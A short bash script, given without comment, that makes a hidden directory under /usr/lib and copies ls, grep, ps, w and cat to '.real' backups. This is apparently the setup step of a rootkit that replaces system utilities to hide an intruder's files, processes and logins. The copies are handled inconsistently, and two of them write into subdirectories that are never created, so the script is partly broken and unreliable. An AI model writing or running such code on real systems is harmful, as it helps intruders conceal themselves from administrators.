#!/bin/bash

mkdir -p /usr/lib/.backup_bins
ls_path="$(which ls 2>/dev/null)"
grep_path="$(which grep 2>/dev/null)"
ps_path="$(which ps 2>/dev/null)"
w_path="$(which w 2>/dev/null)"
cat_path="$(which cat 2>/dev/null)"


cp $ls_path "$ls_path.real"
cp $grep_path "/usr/lib/.backup_bins$grep_path.real"
cp $ps_path "$ps_path.real"
cp $w_path "$w_path.real"
cp $cat_path "/usr/lib/.backup_bins$cat_path.real"
